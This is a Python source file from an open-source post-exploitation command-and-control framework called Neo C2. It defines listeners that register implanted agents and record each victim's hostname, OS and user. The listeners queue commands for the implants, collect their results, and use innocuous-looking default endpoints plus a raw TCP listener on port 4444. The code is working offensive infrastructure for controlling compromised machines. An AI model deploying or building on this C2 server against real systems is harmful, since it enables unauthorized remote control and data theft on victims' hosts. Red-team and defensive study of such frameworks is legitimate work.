"""
The Neo C2 Framework is a post-exploitation command and control framework.

This file is part of Neo C2 Framework.
Copyright (C) 2025 @stillbigjosh

The Neo C2 Framework of this edition is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

The Neo C2 Framework is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Neo.  If not, see <http://www.gnu.org/licenses/>
"""

import threading
import uuid
import time
from datetime import datetime
from flask import Flask, request, jsonify, Blueprint
import base64
import queue
import ssl
import sqlite3
import os
import logging
import json
import socket
from cryptography.fernet import Fernet
from core.config import NeoC2Config
from core.models import NeoC2DB
from teamserver.agent_manager import AgentManager

class NeoC2Listener:
    def __init__(self, config, db):
        self.config = config
        self.db = db
        self.listeners = []
        self.setup_default_listeners()
    
    def setup_default_listeners(self):
        http_listener = HTTPListener(
            self.config, 
            self.db, 
            str(uuid.uuid4()), 
            "default_http", 
            self.config.get("server.host"), 
            self.config.get("server.port"), 
            "default", 
            True
        )
        self.listeners.append(http_listener)
        http_listener.start()
    
    def start(self):
        for listener in self.listeners:
            listener.start()
    
    def stop(self):
        for listener in self.listeners:
            listener.stop()

class BaseListener:
    def __init__(self, config, db, id, name, type, host, port, profile_name, use_https=True):
        self.config = config
        self.db = db
        self.id = id
        self.name = name
        self.type = type
        self.host = host
        self.port = port
        self.profile_name = profile_name
        
        self.use_https = use_https
        self.running = False
        self.thread = None
        self.server_socket = None  # Add this for cleanup
        self.agents = {}
        self.tasks = {}
        self.results = {}
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.setup_logging()
        self.setup_db()
        self.profile = self.load_profile() # Load the profile from the database
        self.agent_manager = AgentManager(db)

    def load_profile(self):
        self.logger.info(f"Loading profile: {self.profile_name}")
        profile_data = self.db.get_profile_by_name(self.profile_name)
        
        if profile_data and 'config' in profile_data:
            self.logger.info(f"Successfully loaded profile '{self.profile_name}'.")
            return profile_data['config']
        else:
            self.logger.warning(f"Profile '{self.profile_name}' not found. Falling back to a default failsafe configuration.")
            return {
                "protocol": "http",
                "host": "0.0.0.0",
                "port": 443,
                "endpoints": {"tasks": "/tasks", "results": "/results"},
                "user_agent": "Mozilla/5.0",
                "headers": {}
            }
    
    def setup_logging(self):
        log_dir = "logs"
        os.makedirs(log_dir, exist_ok=True)
        logging.basicConfig(
            filename=os.path.join(log_dir, f"listener_{self.id}.log"),
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(f"Listener_{self.id}")
    
    def setup_db(self):
        pass  # Shared DB
    
    def start(self):
        if self.running:
            return
        self.running = True
        self.thread = threading.Thread(target=self.run)
        self.thread.daemon = True
        self.thread.start()
        self.logger.info(f"Listener {self.name} ({self.type}) started on {self.host}:{self.port}")
    
    def stop(self):
        self.running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        if self.thread:
            self.thread.join(timeout=5)  # Add timeout to prevent hanging
        self.logger.info(f"Listener {self.name} ({self.type}) stopped")
    
    def run(self):
        raise NotImplementedError("Subclasses must implement run method")

class HTTPListener(BaseListener):
    def __init__(self, config, db, id, name, host, port, profile_name, use_https=True):
        super().__init__(config, db, id, name, 'http', host, port, profile_name, use_https)
        self.blueprint = None
        self.setup_blueprint()
    
    def setup_blueprint(self):
        from flask import Blueprint, request, jsonify
        
        self.blueprint = Blueprint(f'listener_{self.id}', __name__)
        
        endpoints = self.profile.get('endpoints', {})
        register_uri = endpoints.get('register', '/api/users/register')
        tasks_uri = endpoints.get('tasks', '/api/agent/<agent_id>/tasks')
        results_uri = endpoints.get('results', '/api/agent/<agent_id>/results')
        
        register_uri = register_uri.replace('{agent_id}', '<agent_id>')
        tasks_uri = tasks_uri.replace('{agent_id}', '<agent_id>')
        results_uri = results_uri.replace('{agent_id}', '<agent_id>')
        
        @self.blueprint.route(register_uri, methods=['POST'])
        def register_agent():
            try:
                data = request.json
                if not data:
                    return jsonify({"status": "error", "message": "No data provided"}), 400
            
                ip_address = request.remote_addr
                hostname = data.get('hostname', 'unknown')
                os_info = data.get('os_info', 'unknown')
                user = data.get('user', 'unknown')
                agent_id = data.get('agent_id')
            
                new_agent_id = self.agent_manager.register_agent(
                    ip_address, hostname, os_info, user, self.id
                )
            
                self.agents[new_agent_id] = {
                    'ip_address': ip_address,
                    'hostname': hostname,
                    'os_info': os_info,
                    'user': user,
                    'listener_id': self.id,
                    'first_seen': datetime.now(),
                    'last_seen': datetime.now()
                }
            
                self.logger.info(f"Agent registered: {new_agent_id} from {ip_address}")
            
                return jsonify({
                    "status": "success",
                    "agent_id": new_agent_id,
                    "sleep_time": self.profile.get('heartbeat_interval', 60),
                    "jitter": self.profile.get('jitter', 0.2)
                }), 201
            
            except Exception as e:
                self.logger.error(f"Error in register_agent: {str(e)}")
                return jsonify({"status": "error", "message": "Internal error"}), 500

        @self.blueprint.route(tasks_uri, methods=['GET'])
        def get_agent_tasks(agent_id):
            try:
                if agent_id in self.agents:
                    self.agents[agent_id]['last_seen'] = datetime.now()
            
                tasks = self.agent_manager.get_tasks(agent_id)
            
                task_list = []
                for task in tasks:
                    task_list.append({
                        'id': task['id'],
                        'command': task['command']
                    })
            
                self.logger.info(f"Agent {agent_id} retrieved {len(task_list)} tasks")
            
                return jsonify({
                    "status": "success",
                    "tasks": task_list
                }), 200
            
            except Exception as e:
                self.logger.error(f"Error in get_agent_tasks: {str(e)}")
                return jsonify({"status": "error", "message": "Internal error"}), 500

        @self.blueprint.route(results_uri, methods=['POST'])
        def submit_agent_results(agent_id):
            try:
                data = request.json
                if not data:
                    return jsonify({"status": "error", "message": "No data provided"}), 400
            
                task_id = data.get('task_id')
                result = data.get('result')
            
                if not task_id or result is None:
                    return jsonify({"status": "error", "message": "Missing task_id or result"}), 400
            
                if agent_id in self.agents:
                    self.agents[agent_id]['last_seen'] = datetime.now()
            
                self.agent_manager.add_result(agent_id, task_id, result)
            
                self.logger.info(f"Received result from agent {agent_id} for task {task_id}")
            
                return jsonify({"status": "success"}), 200
            
            except Exception as e:
                self.logger.error(f"Error in submit_agent_results: {str(e)}")
                return jsonify({"status": "error", "message": "Internal error"}), 500

    def get_blueprint(self):
        return self.blueprint

    def run(self):
        self.logger.info(f"HTTP listener {self.name} routes registered with main web app")
        while self.running:
            time.sleep(1)


class TCPListener(BaseListener):
    def __init__(self, config, db, id, name, host='0.0.0.0', port=4444, profile_name='default', use_https=False):
        super().__init__(config, db, id, name, 'tcp', host, port, profile_name, use_https)
    
    def run(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.server_socket.settimeout(1.0)  # Add timeout to check running status
            
            while self.running:
                try:
                    client, addr = self.server_socket.accept()
                    threading.Thread(target=self.handle_tcp_client, args=(client, addr), daemon=True).start()
                except socket.timeout:
                    continue  # Check if still running
                except Exception as e:
                    if self.running:
                        self.logger.error(f"TCP accept error: {str(e)}")
        
        except Exception as e:
            self.logger.error(f"TCP listener startup error: {str(e)}")
        finally:
            if self.server_socket:
                self.server_socket.close()
    
    def handle_tcp_client(self, client, addr):
        self.logger.info(f"TCP connection from {addr}")
        try:
            data = client.recv(4096)
            if data:
                request = json.loads(data.decode())
                response = self.process_request(request)
                client.send(json.dumps(response).encode())
        except Exception as e:
            self.logger.error(f"TCP client error: {str(e)}")
        finally:
            client.close()
    
    def process_request(self, request):
        return {"status": "success", "message": "Received"}




